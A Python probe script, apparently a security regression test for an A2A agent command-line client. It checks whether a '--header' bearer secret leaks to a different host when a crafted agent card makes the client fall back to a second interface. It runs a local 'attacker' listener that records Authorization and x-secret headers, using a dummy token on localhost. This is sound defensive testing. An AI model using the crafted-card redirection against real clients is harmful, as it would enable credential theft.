# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Tom F. <tomf@tomtomtech.net> (https://github.com/tomtom215)
"""Live probe for SEC-09 / NEW-f-1: does `a2a --header` send the secret to a
host other than the one typed, when the card's first (same-host) interface
cannot be built and the client falls back to a later interface?

Usage: python3 -I probe_sec09.py A2A_BIN BASE_CARD_JSON MODE
  MODE=fallback : first interface ftp://127.0.0.1/ (same host, unbuildable scheme
                  port), second http://localhost:<B>/ (different host name)
  MODE=direct   : only the second interface (the case SEC-09's fix refuses)
Prints what the attacker listener B saw and the CLI's exit status/stderr.
"""
import http.server
import json
import subprocess
import sys
import threading

a2a, base_card, mode = sys.argv[1], sys.argv[2], sys.argv[3]
seen = []


class B(http.server.BaseHTTPRequestHandler):
    def _any(self):
        n = int(self.headers.get("content-length") or 0)
        self.rfile.read(n)
        seen.append({"path": self.path, "authorization": self.headers.get("authorization"),
                     "x-secret": self.headers.get("x-secret")})
        body = b'{"jsonrpc":"2.0","id":1,"error":{"code":-32603,"message":"attacker"}}'
        self.send_response(200)
        self.send_header("content-type", "application/json")
        self.send_header("content-length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    do_POST = do_GET = _any

    def log_message(self, *a):
        pass


bsrv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), B)
bport = bsrv.server_address[1]
threading.Thread(target=bsrv.serve_forever, daemon=True).start()

card = json.load(open(base_card))
second = {"url": f"http://localhost:{bport}/", "protocolBinding": "JSONRPC", "protocolVersion": "1.0"}
first = {"url": "ftp://127.0.0.1/", "protocolBinding": "JSONRPC", "protocolVersion": "1.0"}
if mode == "unknown-binding":
    first = {"url": f"http://127.0.0.1:{{A}}/", "protocolBinding": "NOPE", "protocolVersion": "1.0"}
card["supportedInterfaces"] = [first, second] if mode in ("fallback", "unknown-binding") else [second]


class A(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps(card).encode()
        self.send_response(200)
        self.send_header("content-type", "application/json")
        self.send_header("content-length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


asrv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), A)
aport = asrv.server_address[1]
if mode == "unknown-binding":
    first["url"] = f"http://127.0.0.1:{aport}/"
threading.Thread(target=asrv.serve_forever, daemon=True).start()

p = subprocess.run(
    [a2a, "--timeout", "5", "--header", "Authorization=Bearer TOP-SECRET-TOKEN", "send",
     f"http://127.0.0.1:{aport}", "hi"],
    capture_output=True, text=True, timeout=60,
)
print(f"MODE={mode} typed=http://127.0.0.1:{aport} attacker=localhost:{bport}")
print("cli exit:", p.returncode)
print("cli stderr:", p.stderr.strip()[:400])
print("attacker saw:", json.dumps(seen))
leaked = any(s["authorization"] == "Bearer TOP-SECRET-TOKEN" for s in seen)
print("SECRET LEAKED TO OTHER HOST:", leaked)
